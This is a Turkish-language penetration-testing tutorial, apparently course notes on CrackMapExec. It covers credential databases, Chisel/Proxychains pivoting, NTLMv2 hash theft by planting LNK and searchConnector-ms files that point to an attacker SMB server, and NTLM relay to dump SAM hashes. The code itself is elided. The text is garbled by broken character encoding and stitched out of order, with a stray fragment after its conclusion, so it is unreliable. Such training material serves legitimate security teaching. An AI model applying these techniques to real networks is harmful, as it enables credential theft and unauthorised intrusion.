cmedb her protokol iÃ§in bir veritabanÄ±na sahiptir, ancak bu modÃ¼lÃ¼n yazÄ±ldÄ±ÄŸÄ± sÄ±rada yalnÄ±zca `SMB` ve `MSSQL` yararlÄ± seÃ§eneklere sahiptir:

| Protokol | SeÃ§enekler                                         |
| -------- | -------------------------------------------------- |
| SMB      | back exit export import groups hosts import shares |
| MSSQL    | back exit export import host import                |
| LDAP     | back exit export import                            |
| WinRM    | back exit export import                            |
| RDP      | back exit export import                            |
| FTP      | back exit export import                            |
| SSH      | back exit export import                            |

Bir protokolÃ¼n veritabanÄ±na eriÅŸmek iÃ§in `proto` `<protocol>` komutunu Ã§alÄ±ÅŸtÄ±rÄ±n. Protokol iÃ§inde, mevcut seÃ§enekleri gÃ¶rÃ¼ntÃ¼lemek iÃ§in `help` seÃ§eneÄŸini kullanabiliriz:

### SMB Protokol VeritabanÄ±na BaÄŸlanma

{{CODE_BLOCK_259}}


### Protocol Options

SMB veya MSSQL protokolÃ¼nÃ¼ her kullandÄ±ÄŸÄ±mÄ±zda, kimlik bilgileri, saldÄ±rdÄ±ÄŸÄ±mÄ±z hostlar, eriÅŸtiÄŸimiz paylaÅŸÄ±mlar ve listelediÄŸimiz gruplar CrackMapExec veritabanÄ±nda saklanÄ±r. VeritabanÄ±nda sahip olduÄŸumuz verilere eriÅŸelim.

### Kimlik Bilgilerini GÃ¶rÃ¼ntÃ¼leme

CrackMapExec veritabanÄ±, CrackMapExec kullanarak kullandÄ±ÄŸÄ±mÄ±z veya elde ettiÄŸimiz tÃ¼m kimlik bilgilerini depolar. Bu veritabanÄ±, kimlik bilgilerinin tÃ¼rÃ¼nÃ¼, `dÃ¼z metin` veya `hash` olup olmadÄ±ÄŸÄ±nÄ±, domain, kullanÄ±cÄ± adÄ± ve ÅŸifreyi saklar. SMB protokolÃ¼nÃ¼n kimlik bilgilerini gÃ¶rmek iÃ§in protokol iÃ§indeki `creds` seÃ§eneÄŸini kullanmamÄ±z gerekir.


### Displaying SMB Credentials

{{CODE_BLOCK_260}}


GÃ¶rdÃ¼ÄŸÃ¼nÃ¼z gibi, creds'ten sonra bir `kullanÄ±cÄ± adÄ±` ekleyerek belirli kullanÄ±cÄ±larÄ± da sorgulayabiliriz. AyrÄ±ca `creds hash` seÃ§eneÄŸi ile tÃ¼m hash'leri veya `creds plaintext` seÃ§eneÄŸi ile tÃ¼m plaintext kimlik bilgilerini listeleyebiliriz.


### Hash'leri ve DÃ¼z Metin Kimlik Bilgilerini GÃ¶rÃ¼ntÃ¼leme

{{CODE_BLOCK_261}}


Not: cmedb, mevcut seÃ§enekleri gÃ¶rÃ¼ntÃ¼lemek iÃ§in sekme otomatik tamamlamaya izin verir

MSSQL kimlik bilgileri MSSQL protokolÃ¼ne kaydedilir ve SMB kimlik bilgilerini gÃ¶rÃ¼ntÃ¼lediÄŸimiz gibi gÃ¶rÃ¼ntÃ¼lenebilir


### MSSQL iÃ§in Kimlik Bilgilerini GÃ¶rÃ¼ntÃ¼leme

{{CODE_BLOCK_262}}

Not: Domain alanÄ±nÄ± bir bilgisayar ile gÃ¶rÃ¼yorsak, bu bir MSSQL hesabÄ± kullandÄ±ÄŸÄ±mÄ±z anlamÄ±na gelir.

### Kimlik Bilgilerini Kullanma

CrackMapExec'i Ã§alÄ±ÅŸtÄ±rmak iÃ§in veritabanÄ±ndaki kimlik bilgilerini de kullanabiliriz. Kullanmak istediÄŸimiz kimlik bilgilerini tanÄ±mlamamÄ±z ve hangi id'nin hesapla iliÅŸkili olduÄŸunu belirlememiz gerekir. `Julio`'nun kimlik bilgilerini `id 4` ile kullanalÄ±m. KullanÄ±cÄ± adÄ± ve parola yerine bir kimlik bilgisi kullanmak iÃ§in `-id CredID` seÃ§eneÄŸini kullanmamÄ±z gerekir.

### CrackMapExec ile EtkileÅŸim iÃ§in CredID KullanÄ±mÄ±

{{CODE_BLOCK_263}}


### Hosts Information

MSSQL ve SMB iÃ§in, eriÅŸim saÄŸladÄ±ÄŸÄ±mÄ±z bilgisayarlarÄ±, IP'lerini, domainlerini ve iÅŸletim sistemlerini de belirleyebiliriz.


### Displaying Hosts

{{CODE_BLOCK_264}}


### Share Information

CME veritabanÄ± da belirlediÄŸimiz paylaÅŸÄ±mlÄ± klasÃ¶rleri saklÄ±yor ve okuma ve yazma eriÅŸimine sahip kullanÄ±cÄ±larÄ±mÄ±z olup olmadÄ±ÄŸÄ±nÄ± bize sÃ¶ylÃ¼yor. PaylaÅŸÄ±m bilgilerine eriÅŸmek iÃ§in `cmedb` iÃ§erisinde SMB protokolÃ¼ iÃ§erisinde `shares` seÃ§eneÄŸini kullanmamÄ±z gerekiyor.

### PaylaÅŸÄ±mlarÄ± Geri Alma

{{CODE_BLOCK_265}}


### KullanÄ±cÄ± Ekleme ve KaldÄ±rma

CME, kullanÄ±cÄ±larÄ± veritabanÄ±ndan manuel olarak ekleme veya kaldÄ±rma Ã¶zelliÄŸini destekler. ProtokolÃ¼ (SMB veya MSSQL) seÃ§iyoruz ve `creds add` veya `creds remove` kullanÄ±yoruz.


### cmedb'ye KullanÄ±cÄ± Ekleme

{{CODE_BLOCK_266}}

Åimdi eklediÄŸimiz kullanÄ±cÄ±yÄ± kaldÄ±rmayÄ± deneyebiliriz.

### Bir KullanÄ±cÄ±yÄ± cmedb'den KaldÄ±rma

{{CODE_BLOCK_267}}


### Empire Kimlik Bilgilerini Ä°mport Etme

cmedb'nin sahip olduÄŸu bir baÅŸka Ã¶zellik de `Empire`'dan kimlik bilgilerini import etme yeteneÄŸidir.


### Import from Empire

{{CODE_BLOCK_268}}

Not: Bu Ã¶zelliÄŸi kullanmak istiyorsanÄ±z `Empire`'Ä± yapÄ±landÄ±rdÄ±ÄŸÄ±nÄ±zdan emin olun

### Export cmedb Data

CrackMapExec veritabanÄ±ndan kimlik bilgilerini, hostlarÄ±, local adminleri ve paylaÅŸÄ±mlarÄ± export edebiliriz.

### Kimlik Bilgilerini cmedb'den Export Etme

{{CODE_BLOCK_269}}

{{CODE_BLOCK_270}}

Veriler CSV dosyasÄ± olarak dÄ±ÅŸa aktarÄ±lÄ±r. `LibreOffice` veya `Excel` gibi araÃ§larÄ± kullanarak aÃ§abiliriz.

![Pasted image 20241203155509.png](/img/user/resimler/Pasted%20image%2020241203155509.png)


### Son

CrackMapExec, aÄŸ gÃ¼venliÄŸi testlerinde ve sÄ±zma testlerinde kullanÄ±cÄ±larÄ±n iÅŸini kolaylaÅŸtÄ±ran, etkili bir araÃ§tÄ±r. GeniÅŸ protokol desteÄŸi, hÄ±zlÄ± keÅŸif, gÃ¼venlik aÃ§Ä±klarÄ± tespiti ve yÃ¶netimsel haklar elde etme gibi Ã§eÅŸitli Ã¶zellikleriyle gÃ¼venlik profesyonellerinin vazgeÃ§ilmez araÃ§larÄ± arasÄ±nda yer alÄ±r. Bu araÃ§, aÄŸ yapÄ±larÄ±nÄ±n daha gÃ¼venli hale getirilmesi iÃ§in Ã¶nemli bir rol oynar ve her gÃ¼venlik uzmanÄ±nÄ±n repertuarÄ±nda bulunmasÄ± gereken bir araÃ§tÄ±r.


, 'print

{{CODE_BLOCK_96}}

Not: SabÄ±rlÄ± olmamÄ±z gerekiyor. PaylaÅŸÄ±lan klasÃ¶r ve dosya sayÄ±sÄ±na baÄŸlÄ± olarak iÅŸlem birkaÃ§ dakika sÃ¼rebilir

`spider_plus` modÃ¼lÃ¼ iÃ§in mevcut tÃ¼m seÃ§enekleri gÃ¶rÃ¼ntÃ¼lemek iÃ§in `--options` seÃ§eneÄŸini kullanabiliriz:


### Spider_plus Options

{{CODE_BLOCK_97}}

Bir sonraki bÃ¶lÃ¼mde CrackMapExec'in bir `proxy` aracÄ±lÄ±ÄŸÄ±yla diÄŸer aÄŸlara ulaÅŸmak iÃ§in nasÄ±l kullanÄ±lacaÄŸÄ± anlatÄ±lacaktÄ±r.


---


### Proxychains with CME

### Scenario

Ä°nternal bir Pentest Ã¼zerinde Ã§alÄ±ÅŸÄ±yoruz. Bir aÄŸ taramasÄ± gerÃ§ekleÅŸtirdik ve yalnÄ±zca bir host (10.129.204.133) tespit edip ele geÃ§irebildik. Ele geÃ§irilen bu host Ã¼zerinde `ipconfig` Ã§alÄ±ÅŸtÄ±rdÄ±ÄŸÄ±mÄ±zda, iki aÄŸ baÄŸdaÅŸtÄ±rÄ±cÄ±sÄ± olduÄŸunu fark ettik. ARP tablosu `172.16.1.10` IP adresine sahip baÅŸka bir hostu gÃ¶steriyor. TopladÄ±ÄŸÄ±mÄ±z bilgilere dayanarak aÅŸaÄŸÄ±daki senaryoya sahibiz:

![Pasted image 20241202141946.png](/img/user/resimler/Pasted%20image%2020241202141946.png)

DC01'e ve bu aÄŸdaki (172.16.1.0/24) herhangi bir makineye saldÄ±rmak iÃ§in, saldÄ±rÄ± hostumuz ile MS01 arasÄ±nda bir `tÃ¼nel` kurmalÄ±yÄ±z. Bu nedenle, CME tarafÄ±ndan yÃ¼rÃ¼tÃ¼len tÃ¼m komutlar MS01 Ã¼zerinden geÃ§er.


### Set Up the Tunnel

TÃ¼nelimizi kurmak iÃ§in [Chisel](https://github.com/jpillora/chisel) kullanacaÄŸÄ±z. [Release](https://github.com/jpillora/chisel/releases)'e gidelim ve saldÄ±racaÄŸÄ±mÄ±z makinemiz iÃ§in en son Windows binary'sini ve saldÄ±rÄ± hostumuzda kullanmak iÃ§in en yeni Linux binary'sini indirelim ve aÅŸaÄŸÄ±daki adÄ±mlarÄ± gerÃ§ekleÅŸtirelim:

*  Chisel'Ä± SaldÄ±rÄ± Hostumuza indirin ve Ã‡alÄ±ÅŸtÄ±rÄ±n:

### Chisel - Reverse Tunnel

{{CODE_BLOCK_98}}


*  Chisel for Windows'u Ä°ndirin ve Hedef Host'a YÃ¼kleyin:


### Upload Chisel

{{CODE_BLOCK_99}}


* CrackMapExec komut yÃ¼rÃ¼tme seÃ§eneÄŸi `-x`'i kullanarak Chisel sunucumuza baÄŸlanmak iÃ§in `chisel.exe` dosyasÄ±nÄ± Ã§alÄ±ÅŸtÄ±rÄ±n (Bu seÃ§eneÄŸi Komut YÃ¼rÃ¼tme bÃ¶lÃ¼mÃ¼nde daha fazla tartÄ±ÅŸacaÄŸÄ±z)


### Connect to the Chisel Server

{{CODE_BLOCK_100}}

Bu terminaldeki komut, hedef makinadaki **Chisel** process'ini durdurana kadar Ã§alÄ±ÅŸmaya devam edecektir. Bunu bu bÃ¶lÃ¼mde daha sonra yapacaÄŸÄ±z.

**Attack host** Ã¼zerinde, **Chisel server** Ã§Ä±ktÄ±sÄ±nda **bir client baÄŸlantÄ±sÄ± aldÄ±ÄŸÄ±mÄ±zÄ± ve tÃ¼neli baÅŸlattÄ±ÄŸÄ±mÄ±zÄ±** gÃ¶steren yeni bir satÄ±r gÃ¶rmeliyiz.

### Chisel Receiving Session No. 1

{{CODE_BLOCK_101}}

TCP 1080 portunun dinlenip dinlenmediÄŸini kontrol ederek de tÃ¼nelin Ã§alÄ±ÅŸtÄ±ÄŸÄ±nÄ± doÄŸrulayabiliriz:


### Check Listening Port

{{CODE_BLOCK_102}}

* Proxyychains'i Chisel varsayÄ±lan portu `TCP 1080`'i kullanacak ÅŸekilde yapÄ±landÄ±rmamÄ±z gerekir. YapÄ±landÄ±rma dosyasÄ±nÄ±n ProxyList bÃ¶lÃ¼mÃ¼ne `socks5 127.0.0.1 1080`'i aÅŸaÄŸÄ±daki gibi eklediÄŸimizden emin olmamÄ±z gerekiyor:


### Configure Proxychains

{{CODE_BLOCK_103}}

* ArtÄ±k 172.16.1.10 IP'sine ulaÅŸmak iÃ§in `Proxychains` aracÄ±lÄ±ÄŸÄ±yla CrackMapExec'i kullanabiliriz:

### CrackMapExec'in Proxychains ile Test Edilmesi

{{CODE_BLOCK_104}}


Proxychains Ã§Ä±ktÄ±sÄ±nÄ± konsoldan kaldÄ±rmak iÃ§in `Proxychains4` ve `quiet -q` seÃ§eneÄŸini kullanabiliriz:

### Quiet SeÃ§eneÄŸi ile Proxychains4

{{CODE_BLOCK_105}}

Proxychains aracÄ±lÄ±ÄŸÄ±yla herhangi bir CME iÅŸlemi gerÃ§ekleÅŸtirebiliriz.


### Killing Chisel on the Target Machine

Ä°ÅŸimiz bittiÄŸinde, Chisel process'ini kill etmemiz gerekir. Bunu yapmak iÃ§in, PowerShell komutlarÄ±nÄ± yÃ¼rÃ¼tmek iÃ§in `-X` seÃ§eneÄŸini kullanacaÄŸÄ±z ve PowerShell komutunu Ã§alÄ±ÅŸtÄ±racaÄŸÄ±z `Stop-Process - Name chisel -Force .` Komut yÃ¼rÃ¼tme konusunu Komut YÃ¼rÃ¼tme bÃ¶lÃ¼mÃ¼nde daha ayrÄ±ntÄ±lÄ± olarak ele alacaÄŸÄ±z.


### Kill the Chisel Client

{{CODE_BLOCK_106}}

Bunu yaptÄ±ktan sonra, Chisel client komutunu Ã§alÄ±ÅŸtÄ±rdÄ±ÄŸÄ±mÄ±z terminal aÅŸaÄŸÄ±daki gibi sonuÃ§lanmalÄ±dÄ±r:


### Chisel'i Zorla Durdurduktan Sonra Terminalin KapanmasÄ±

{{CODE_BLOCK_107}}

ArtÄ±k saldÄ±rÄ± konaÄŸÄ±mÄ±zdaki Chisel sunucusunu CTRL + C ile kapatabiliriz.


### Attack Host Ãœzerinde Chisel'i Kapatma

{{CODE_BLOCK_108}}


### Sunucu olarak Windows ve Client olarak Linux

Chisel'i Windows workstation'da bir sunucu olarak baÅŸlatarak ve saldÄ±rÄ± hostumuzu client olarak kullanarak bunun tersini de yapabiliriz. Chisel'i sunucu olarak baÅŸlatmak iÃ§in `server --socks5` seÃ§eneÄŸini kullanacaÄŸÄ±z.


### Chisel'i Hedef Makinede Sunucu Olarak BaÅŸlatma

{{CODE_BLOCK_109}}

Åimdi hedef makinemiz Chisel sunucusuna baÄŸlanmak ve proxy'yi etkinleÅŸtirmek iÃ§in IP ve porttan sonra `socks` seÃ§eneÄŸini kullanmamÄ±z gerekiyor.


### Attack Hostumuzdan Chisel Sunucusuna BaÄŸlanma

{{CODE_BLOCK_110}}

Åimdi Proxychains'i tekrar kullanabiliriz:

### Internal Network'e BaÄŸlanmak iÃ§in Proxy Chain'i Kullanma

{{CODE_BLOCK_111}}

Bu bÃ¶lÃ¼mde, **attack host** Ã¼zerinde **Proxychains** ve **Chisel** yapÄ±landÄ±rmayÄ± ve **CrackMapExec** kullanarak hedef makinede **Chisel** Ã§alÄ±ÅŸtÄ±rmayÄ± Ã¶ÄŸrendik.

Ä°lerleyen bÃ¶lÃ¼mlerde, diÄŸer aÄŸlara ulaÅŸmak iÃ§in `CrackMapExec` ve `Proxychains` kullanacaÄŸÄ±z.

---

### Stealing Hashes

Yeni hesaplarÄ± ele geÃ§irmek iÃ§in kullanÄ±lan en yaygÄ±n tekniklerden biri parola hashlerinin Ã§alÄ±nmasÄ±dÄ±r. Bunu baÅŸarmanÄ±n farklÄ± yÃ¶ntemleri vardÄ±r, ancak yaygÄ±n olanÄ±, bir bilgisayarÄ± veya kullanÄ±cÄ±yÄ± kontrol ettiÄŸimiz sahte bir paylaÅŸÄ±lan klasÃ¶rle bir kimlik doÄŸrulama iÅŸlemi baÅŸlatmaya zorlamaktÄ±r.

Bu kimlik doÄŸrulama iÅŸlemini baÅŸlatÄ±rken, kullanÄ±cÄ± veya bilgisayar bunu bir NTLMv2 hash'i ile yapar. Bu hash, Hashcat gibi bir araÃ§ kullanÄ±larak kÄ±rÄ±labilir veya kimlik bilgilerini bilmeden kullanÄ±cÄ±nÄ±n kimliÄŸine bÃ¼rÃ¼nmek iÃ§in baÅŸka bir bilgisayara iletilebilir.

PaylaÅŸÄ±lan klasÃ¶rleri kullanarak hash'leri Ã§almak iÃ§in bir kÄ±sayol oluÅŸturabilir ve kÄ±sayolda gÃ¶rÃ¼nen simge sahte paylaÅŸÄ±lan klasÃ¶rÃ¼mÃ¼zÃ¼ gÃ¶sterecek ÅŸekilde yapÄ±landÄ±rabiliriz. KullanÄ±cÄ± paylaÅŸÄ±lan klasÃ¶re girdiÄŸinde, simgenin konumunu aramaya Ã§alÄ±ÅŸacak ve paylaÅŸÄ±lan klasÃ¶rÃ¼mÃ¼ze karÅŸÄ± kimlik doÄŸrulamasÄ±nÄ± zorlayacaktÄ±r.

NTLMv2 hash'lerini toplama hakkÄ±nda daha fazla bilgi edinmek iÃ§in RedTeam Ekipler iÃ§in [Farming blogunu okuyabiliriz: MDsec'ten NetNTLM hasadÄ±](https://www.mdsec.co.uk/2021/02/farming-for-red-teams-harvesting-netntlm/), sadece kÄ±sayollarÄ±n kullanÄ±mÄ±nÄ± deÄŸil, aynÄ± amaca hizmet eden diÄŸer dosya tÃ¼rlerini de gÃ¶sterir.


### Slinky ModÃ¼lÃ¼

`Slinky`, [@byt3bl33d3r](https://twitter.com/byt3bl33d3r) tarafÄ±ndan oluÅŸturulan bir modÃ¼ldÃ¼r ve CME'deki en heyecan verici modÃ¼llerden biridir. Prensip basittir. ModÃ¼l, yazma izinlerine sahip tÃ¼m paylaÅŸÄ±mlarda belirtilen SMB sunucusuna bir UNC yolu iÃ§eren simge attribute'a sahip Windows kÄ±sayollarÄ± oluÅŸturur. Birisi paylaÅŸÄ±mÄ± ziyaret ettiÄŸinde, simge attribute'u sunucumuza giden bir UNC yolu iÃ§erdiÄŸi iÃ§in `Responder` kullanarak NTLMv2 hash'ini alacaÄŸÄ±z.

ModÃ¼lÃ¼n `SERVER` ve `NAME` olmak Ã¼zere iki zorunlu seÃ§eneÄŸi ve bir isteÄŸe baÄŸlÄ± `CLEANUP` seÃ§eneÄŸi vardÄ±r.


### Slinky Module Options

{{CODE_BLOCK_112}}

`SERVER`, kontrol ettiÄŸimiz SMB sunucusunun IP'sine ve UNC yolunun iÅŸaret etmesini istediÄŸimiz yere karÅŸÄ±lÄ±k gelir. `NAME` seÃ§eneÄŸi kÄ±sayol dosyasÄ±na bir isim atar, `CLEANUP` ise iÅŸimiz bittiÄŸinde kÄ±sayolu silmek iÃ§indir.


### Chisel kullanarak baÄŸlama

Bu alÄ±ÅŸtÄ±rma iÃ§in lokal eriÅŸimi simÃ¼le edeceÄŸiz ve internal aÄŸa baÄŸlanmak iÃ§in Chisel ve Proxychains kullanacaÄŸÄ±z. Chisel zaten hedef makinemizde bir sunucu olarak Ã§alÄ±ÅŸÄ±yor ve bir client olarak baÄŸlanmamÄ±z ve daha sonra internal aÄŸÄ± numaralandÄ±rmak iÃ§in proxychains kullanmamÄ±z gerekiyor. Chisel kullanarak baÄŸlanmak iÃ§in aÅŸaÄŸÄ±daki komutu **kullanalÄ±m**


### Hedef Makine Chisel Sunucusuna BaÄŸlanma

{{CODE_BLOCK_113}}


### NTLMv2 Hash'lerinin Ã‡alÄ±nmasÄ±
Ä°lk olarak, `--shares` seÃ§eneÄŸini kullanarak `grace` kullanÄ±cÄ±sÄ±nÄ±n `WRITE` ayrÄ±calÄ±klarÄ±na sahip olduÄŸu bir paylaÅŸÄ±m bulalÄ±m:

### WRITE AyrÄ±calÄ±klarÄ±na Sahip PaylaÅŸÄ±mlarÄ± Bulma

{{CODE_BLOCK_114}}


GÃ¶rdÃ¼ÄŸÃ¼mÃ¼z gibi, `grace` `HR` ve `IT-Tools` paylaÅŸÄ±mlarÄ±na yazabilir. Bu nedenle her bir paylaÅŸÄ±ma bir `LNK` dosyasÄ± yazmak iÃ§in `Slinky` modÃ¼lÃ¼nÃ¼ kullanabiliriz. 

**SERVER=10.10.14.33** seÃ§eneÄŸini kullanarak **attack host**'umuzun **tun0** aÄŸÄ±ndaki **IP adresini** belirteceÄŸiz ve **NAME=important** seÃ§eneÄŸiyle **LNK dosyasÄ±na atanacak dosya adÄ±nÄ±** belirleyeceÄŸiz.


### Using Slinky

{{CODE_BLOCK_115}}


![Pasted image 20241202171933.png](/img/user/resimler/Pasted%20image%2020241202171933.png)

**Not:** **CrackMapExec**, genellikle **`OpSec` aÃ§Ä±sÄ±ndan gÃ¼venli** olarak kabul edilir Ã§Ã¼nkÃ¼ tÃ¼m iÅŸlemler ya **`bellekte` Ã§alÄ±ÅŸtÄ±rÄ±lÄ±r**, ya **`WinAPI` Ã§aÄŸrÄ±larÄ±yla aÄŸ Ã¼zerinden sorgulanÄ±r**, ya da **Windows'un built-in araÃ§larÄ±/Ã¶zellikleri** kullanÄ±larak gerÃ§ekleÅŸtirilir.

Bu gereksinimleri karÅŸÄ±lamayan bir modÃ¼l Ã§alÄ±ÅŸtÄ±rmaya Ã§alÄ±ÅŸtÄ±ÄŸÄ±mÄ±zda, **Ã¶nceden bir uyarÄ± alÄ±rÄ±z**. **`Slinky`** modÃ¼lÃ¼, **OpSec aÃ§Ä±sÄ±ndan gÃ¼venli olmayan** bir modÃ¼le Ã¶rnektir. Devam etmeden Ã¶nce **bir uyarÄ± alacaÄŸÄ±z**.

LNK dosyasÄ± oluÅŸturulduktan sonra, Responder'Ä± Ã§alÄ±ÅŸtÄ±rmamÄ±z ve birinin paylaÅŸÄ±ma gÃ¶z atmasÄ±nÄ± beklememiz gerekir. 


### Starting Responder

{{CODE_BLOCK_116}}

Not: Hash'i yakalamak iÃ§in `Responder.conf` dosyasÄ±nda SMB seÃ§eneÄŸi `On` olmalÄ±dÄ±r.

NTLMv2 hash'imizi aldÄ±k ve hesabÄ± kullanmak iÃ§in onu kÄ±rmamÄ±z gerekiyor veya bir `NTLM Relay` yapabiliriz. Bunu kÄ±rmak iÃ§in, `ASREPRoast` ve `Kerberoasting` ile yaptÄ±ÄŸÄ±mÄ±z gibi `Hashcat mod 5600`'Ã¼ kullanabiliriz. `NTLM Relay`'e odaklanalÄ±m.


### **NTLM Relay**

DiÄŸer bir Ã§Ã¶zÃ¼m ise NTLMv2 hash'ini doÄŸrudan `SMB Sign`'nÄ±n devre dÄ±ÅŸÄ± bÄ±rakÄ±ldÄ±ÄŸÄ± aÄŸdaki diÄŸer sunuculara ve workstation'lara iletmektir. SMB Sign Ã§ok Ã¶nemlidir Ã§Ã¼nkÃ¼ bir bilgisayarda SMB Sign etkinse, saldÄ±rÄ± hostumuzun kimliÄŸini kanÄ±tlayamayacaÄŸÄ±mÄ±z iÃ§in o bilgisayara relay yapamayÄ±z. SMB Sign'nÄ±n devre dÄ±ÅŸÄ± bÄ±rakÄ±ldÄ±ÄŸÄ± hedeflerin bir listesini almak iÃ§in `--gen-relay-list` seÃ§eneÄŸini kullanabiliriz.

Åimdi Proxychains'i kullanabilir ve SMB Sign devre dÄ±ÅŸÄ± bÄ±rakÄ±lmÄ±ÅŸ makinelerin bir listesini alabiliriz

### Getting Relay List

{{CODE_BLOCK_117}}


**`ntlmrelayx`** aracÄ±nÄ±, daha Ã¶nce **`--gen-relay-list`** seÃ§eneÄŸiyle elde ettiÄŸimiz listeyle birlikte kullanacaÄŸÄ±z.

Hedef makinede **local administrator** ayrÄ±calÄ±klarÄ±na sahip bir hesap bulursak ve ek seÃ§enekler belirtmezsek, **`ntlmrelayx`** otomatik olarak hedef makinenin **`SAM` database**'ini dump edecektir. Bu sayede, herhangi bir **local admin kullanÄ±cÄ±sÄ±nÄ±n hash'leriyle** bir **`pass-the-hash attack`** gerÃ§ekleÅŸtirmeyi deneyebiliriz.

### Execute NTLMRelayX

{{CODE_BLOCK_118}}

Bir kullanÄ±cÄ±nÄ±n **SMB share**'ine eriÅŸmesini beklemeliyiz. **LNK dosyamÄ±z**, kullanÄ±cÄ±nÄ±n hedef makinemize baÄŸlanmasÄ±nÄ± zorlar (**bu iÅŸlem arka planda gerÃ§ekleÅŸir ve kullanÄ±cÄ± herhangi bir anormallik fark etmez**).

Bu gerÃ§ekleÅŸtiÄŸinde, **`ntlmrelayx`** konsolunda aÅŸaÄŸÄ±dakine benzer bir Ã§Ä±ktÄ± gÃ¶rmeliyiz:

{{CODE_BLOCK_119}}

ArdÄ±ndan, administrator hash'ini kullanarak hedef makinede kimlik doÄŸrulamasÄ± yapmak iÃ§in crackmapexec'i kullanabiliriz:

### Local HesaplarÄ± Test Etme

{{CODE_BLOCK_120}}

### Her Åeyi Temizleyin

ModÃ¼lÃ¼ kullandÄ±ktan sonra, **LNK dosyasÄ±nÄ± temizlemek** iÃ§in **`-o CLEANUP=YES`** seÃ§eneÄŸini ve **LNK dosyasÄ±nÄ±n adÄ±nÄ±** (**`NAME=important`**) belirtmek kritik Ã¶nem taÅŸÄ±r.

### Cleanup

{{CODE_BLOCK_121}}

### drop-sc ModÃ¼lÃ¼ ile Hash'lerin Ã‡alÄ±nmasÄ±

Bu bÃ¶lÃ¼mÃ¼ tamamlamadan Ã¶nce, **LNK** dÄ±ÅŸÄ±nda baÅŸka bir dosya formatÄ± kullanarak kimlik doÄŸrulamasÄ±nÄ± zorlamanÄ±n baÅŸka bir yÃ¶ntemine bakalÄ±m: **[.searchConnector-ms](https://learn.microsoft.com/en-us/windows/win32/search/search-sconn-desc-schema-entry)** ve **`.library-ms`** formatlarÄ±. Bu dosya formatlarÄ±nÄ±n Ã§oÄŸu Windows sÃ¼rÃ¼mÃ¼nde **varsayÄ±lan dosya iliÅŸkilendirmeleri** bulunur. Windows ile entegre Ã§alÄ±ÅŸarak iÃ§eriÄŸi rastgele bir konumdan, hatta **`WebDAV` paylaÅŸÄ±mÄ±yla belirtilen remote bir konumdan** gÃ¶sterebilirler.

Ã–zetle, bu dosyalar **LNK** dosyasÄ±yla aynÄ± iÅŸlevi gÃ¶rÃ¼r. Bu yÃ¶ntemin keÅŸfi hakkÄ±nda daha fazla bilgi edinmek iÃ§in **"[Exploring search connectors and library files in Windows](https://dtm.uk/exploring-search-connectors-and-library-files-on-windows/)"** baÅŸlÄ±klÄ± blog yazÄ±sÄ±nÄ± okuyabiliriz.

CrackMapExec, **`drop-sc`** adÄ±nda bir modÃ¼le sahiptir. Bu modÃ¼l, paylaÅŸÄ±lan bir klasÃ¶rde **`searchConnector-ms`** dosyasÄ± oluÅŸturmamÄ±za olanak tanÄ±r. Kullanabilmek iÃ§in **URL** seÃ§eneÄŸini belirterek **SMB fake sunucumuzu** hedef gÃ¶stermemiz gerekir. Bu durumda, **`ntlmrelayx`** Ã§alÄ±ÅŸtÄ±ran hostumuz olacaktÄ±r. **URL** deÄŸeri Ã§ift ters eÄŸik Ã§izgi (`\`) ile kaÃ§Ä±rÄ±lmalÄ±dÄ±r. Ã–rneÄŸin: **`URL=\\10.10.14.33\secret`**.

Ä°steÄŸe baÄŸlÄ± olarak aÅŸaÄŸÄ±daki seÃ§enekleri belirleyebiliriz:

* `SHARE=name` seÃ§eneÄŸi ile hedef paylaÅŸÄ±mlÄ± klasÃ¶r . Bu seÃ§eneÄŸi belirtmezsek, dosyayÄ± `WRITE` izinlerine sahip tÃ¼m paylaÅŸÄ±mlara yazacaktÄ±r

* `FILENAME=name` seÃ§eneÄŸi ile dosya adÄ± . Bu seÃ§eneÄŸi belirtmezsek, â€œ`Documents`â€ adÄ±nda bir dosya oluÅŸturacaktÄ±r.

* OluÅŸturduÄŸumuz dosyalarÄ± temizlemek istiyorsak `CLEANUP=True` seÃ§eneÄŸi. EÄŸer Ã¶zel bir isim kullanacaksak filename seÃ§eneÄŸini belirtmemiz gerekiyor.

Drop-sc'yi iÅŸ baÅŸÄ±nda gÃ¶relim:

### Dropping a searchConnector-ms File

{{CODE_BLOCK_122}}

{{CODE_BLOCK_123}}

Bir kullanÄ±cÄ± **paylaÅŸÄ±lan klasÃ¶re** eriÅŸtiÄŸinde ve **ntlmrelayx** dinleme modunda Ã§alÄ±ÅŸÄ±rken, kimlik bilgilerini **hedef makineye yÃ¶nlendirebilmemiz** gerekir.

### NTLMRelayx ve drop-sc Kullanarak YÃ¶nlendirme

{{CODE_BLOCK_124}}

Son olarak, `CLEANUP=True` seÃ§eneÄŸi ile `.searchConnector-ms` dosyasÄ±nÄ± temizleyebiliriz:


### searchConnector-ms DosyalarÄ±nÄ± Temizleme

{{CODE_BLOCK_125}}


LNK dosyalarÄ± genellikle bu tÃ¼r saldÄ±rÄ±lar iÃ§in bilinir. `.searchConnector-ms` gibi baÅŸka bir dosya tÃ¼rÃ¼ kullanmak, fark edilmemenize yardÄ±mcÄ± olabilir.

Sonraki bÃ¶lÃ¼mlerde CrackMapExec'in keÅŸif seÃ§eneklerini inceleyeceÄŸiz.

---


### SMB ile Mapping ve Enumeration

CrackMapExec, geÃ§erli bir domain kullanÄ±cÄ± hesabÄ±yla numaralandÄ±rma sÃ¶z konusu olduÄŸunda Ã§ok daha fazla seÃ§enekle birlikte gelir. En Ã§ok kullanÄ±lan seÃ§enekleri ele aldÄ±k, ancak daha derine inelim. Ä°ÅŸte ayrÄ±calÄ±klÄ± olmasa bile geÃ§erli bir hesap aldÄ±ÄŸÄ±mÄ±zda kullanabileceÄŸimiz tÃ¼m seÃ§eneklerin listesi:

| Komut                                                                 | AÃ§Ä±klama                                                          |
| --------------------------------------------------------------------- | ----------------------------------------------------------------- |
| `crackmapexec smb <hedef> -u <kullanÄ±cÄ±> -p <ÅŸifre> --loggedon-users` | Hedefte oturum aÃ§mÄ±ÅŸ kullanÄ±cÄ±larÄ± listeler.                      |
| `crackmapexec smb <hedef> -u <kullanÄ±cÄ±> -p <ÅŸifre> --sessions`       | Hedefteki aktif oturumlarÄ± listeler.                              |
| `crackmapexec smb <hedef> -u <kullanÄ±cÄ±> -p <ÅŸifre> --disks`          | Hedefteki diskleri listeler.                                      |
| `crackmapexec smb <hedef> -u <kullanÄ±cÄ±> -p <ÅŸifre> --computers`      | Hedef aÄŸdaki bilgisayarlarÄ± listeler.                             |
